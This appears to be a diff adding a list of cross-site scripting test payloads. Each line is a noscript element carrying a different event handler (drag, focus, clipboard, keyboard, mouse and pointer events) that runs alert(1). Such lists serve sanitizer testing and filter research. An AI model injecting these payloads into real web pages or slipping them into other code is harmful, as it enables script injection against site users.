@@ -1,0 +1,43 @@
+<noscript draggable="true" ondrag="alert(1)">test</noscript>
+<noscript draggable="true" ondragend="alert(1)">test</noscript>
+<noscript draggable="true" ondragenter="alert(1)">test</noscript>
+<noscript draggable="true" ondragleave="alert(1)">test</noscript>
+<noscript draggable="true" ondragstart="alert(1)">test</noscript>
+<noscript id=x tabindex=1 onactivate=alert(1)></noscript>
+<noscript id=x tabindex=1 onbeforeactivate=alert(1)></noscript>
+<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>
+<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>
+<noscript id=x tabindex=1 onfocus=alert(1)></noscript>
+<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
+<noscript onafterscriptexecute=alert(1)><script>1</script>
+<noscript onbeforecopy="alert(1)" contenteditable>test</noscript>
+<noscript onbeforecut="alert(1)" contenteditable>test</noscript>
+<noscript onbeforepaste="alert(1)" contenteditable>test</noscript>
+<noscript onbeforescriptexecute=alert(1)><script>1</script>
+<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>
+<noscript onclick="alert(1)">test</noscript>
+<noscript oncontextmenu="alert(1)">test</noscript>
+<noscript oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<noscript oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<noscript ondblclick="alert(1)" autofocus tabindex=1>test</noscript>
+<noscript onfocusout=alert(1) tabindex=1 id=x></noscript><input autofocus>
+<noscript onkeydown="alert(1)" contenteditable>test</noscript>
+<noscript onkeypress="alert(1)" contenteditable>test</noscript>
+<noscript onkeyup="alert(1)" contenteditable>test</noscript>
+<noscript onmousedown="alert(1)">test</noscript>
+<noscript onmouseenter="alert(1)">test</noscript>
+<noscript onmouseleave="alert(1)">test</noscript>
+<noscript onmousemove="alert(1)">test</noscript>
+<noscript onmouseout="alert(1)">test</noscript>
+<noscript onmouseover="alert(1)">test</noscript>
+<noscript onmouseup="alert(1)">test</noscript>
+<noscript onmousewheel=alert(1)>requires scrolling
+<noscript onpaste="alert(1)" contenteditable>test</noscript>
+<noscript onpointerdown=alert(1)>XSS</noscript>
+<noscript onpointerenter=alert(1)>XSS</noscript>
+<noscript onpointerleave=alert(1)>XSS</noscript>
+<noscript onpointermove=alert(1)>XSS</noscript>
+<noscript onpointerout=alert(1)>XSS</noscript>
+<noscript onpointerover=alert(1)>XSS</noscript>
+<noscript onpointerrawupdate=alert(1)>XSS</noscript>
+<noscript onpointerup=alert(1)>XSS</noscript>
